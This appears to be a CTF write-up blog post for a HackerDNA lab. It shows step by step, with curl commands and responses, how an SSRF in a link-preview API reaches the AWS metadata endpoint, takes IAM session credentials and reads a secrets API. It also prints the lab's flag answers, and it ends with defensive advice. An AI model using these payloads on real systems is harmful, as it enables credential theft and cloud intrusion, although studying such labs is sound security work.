---
layout: post
title: "SSRF Attack - Steal Cloud Metadata Credentials"
description: "CTF writeup exploiting a server-side request forgery in a link preview service to reach the AWS instance metadata endpoint, retrieve IAM credentials, and use them to read the root flag from an internal control-plane API."
category: hackerdna
tags: [web, ctf, hackerdna, ssrf, aws, cloud-security, iam, metadata, secrets-manager]
---

## SSRF Attack: Steal Cloud Metadata Credentials - CTF Writeup

**Category:** WEB | **Flags:** 2 (User / Root)

Challenge: [https://hackerdna.com/labs/ssrf-attack-cloud-metadata-credentials](https://hackerdna.com/labs/ssrf-attack-cloud-metadata-credentials)

## Contents

- [Reconnaissance](#reconnaissance)
- [The SSRF: /api/unfurl](#the-ssrf-apiunfurl)
- [Reading Cloud Metadata](#reading-cloud-metadata)
- [The Control Plane](#the-control-plane)
- [Retrieving the Root Flag](#retrieving-the-root-flag)

## Reconnaissance

The target hosts **Previewly**, a "link previews as a service" web app. A
standard landing page with a URL preview form, plus a `/health` endpoint:

```
GET /health → 200 OK
```

A closer look at the client-side JS reveals the core functionality:

```javascript
const res = await fetch('/api/unfurl', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({url})
});
```

The server fetches the user-supplied URL server-side and returns a metadata
preview. Classic SSRF.

## The SSRF: /api/unfurl

Calling the endpoint directly with an arbitrary URL:

```bash
curl -s "http://TARGET/api/unfurl" -X POST \
  -H "Content-Type: application/json" \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

Returns:

```json
{"body_preview":"ami-id\nhostname\niam/\ninstance-id\n...","status":200,...}
```

The `body_preview` field contains the response body from the target URL,
confirming full SSRF against an AWS instance metadata endpoint.

## Reading Cloud Metadata

The AWS metadata at `169.254.169.254` exposes the IAM role and its temporary
credentials:

```bash
# IAM role name
curl -s ... -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
→ "previewly-fetcher-role"

# Full credentials
curl -s ... -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/previewly-fetcher-role"}'
```

The response includes the AWS session token:

```
AccessKeyId:     ASIACGWGAJY8A9FU8SVO
SecretAccessKey:  PUqz6KgpUDeXok5t4Hmb0bbqShMwJockHWhpJP37
Token:           IQoJb3JpZ2luX2VjEu...
```

A second metadata path reveals the user flag directly in **user-data**:

```bash
curl -s ... -d '{"url":"http://169.254.169.254/latest/user-data"}'
```

```
USER_FLAG=f5f39ad2-873e-486c-a6cf-08a73e80ca3b
```

The user-data also hints at an internal service:

```
Internal control-plane API at /control-plane/ on this host
(authenticate with the role session token).
```

## The Control Plane

Hitting the internal control-plane with the stolen Bearer token:

```bash
curl -s "http://TARGET/control-plane/whoami" \
  -H "Authorization: Bearer <session-token>"
```

```json
{"role":"previewly-fetcher-role",
 "account":"481516234200",
 "arn":"arn:aws:sts::481516234200:assumed-role/previewly-fetcher-role/i-...",
 "authorized":true}
```

Querying the secrets endpoint:

```bash
curl -s "http://TARGET/control-plane/v1/secrets" -H "Authorization: Bearer <session-token>"
→ {"secrets":["previewly/og-cache-config","previewly/root-flag"]}
```

## Retrieving the Root Flag

Reading the actual secret value:

```bash
curl -s "http://TARGET/control-plane/v1/secrets/previewly/root-flag" \
  -H "Authorization: Bearer <session-token>"
```

```json
{"name":"previewly/root-flag",
 "value":"946e5f60-2592-4292-8082-d1ed425429a1",
 "note":"Root Flag - submit this value as your Root Flag."}
```

**Root Flag:** `946e5f60-2592-4292-8082-d1ed425429a1`

## How the Attack Works

1. **Unrestricted SSRF** — the preview service fetches any URL without
   validation, giving access to the link-local metadata endpoint.
2. **IMDSv1 enabled** — the instance uses Instance Metadata Service v1
   (no token hop required), making metadata instantly readable.
3. **Leaked credentials** — IAM role `previewly-fetcher-role` with its
   session token are accessible through the SSRF.
4. **Internal control-plane** — the Bearer token authenticates against a
   Secrets Manager-style API that holds the root flag.

## Key Takeaways

- **Disable IMDSv1.** Use IMDSv2 (requires a PUT token before GET) to
  block basic SSRF-to-metadata exploits.
- **Firewall link-local.** Block `169.254.169.254` and `169.254.170.2`
  at the network boundary or in the application layer.
- **Restrict SSRF targets.** Allowlist permitted domains for URL previews;
  never trust user-supplied URLs as-is.
- **Least-privilege IAM.** The fetcher role had Secrets Manager read access
  over sensitive flags — scope roles tightly.
- **Use Secrets Manager** with resource policies and conditions, not just
  IAM roles, to restrict which callers can read secret values.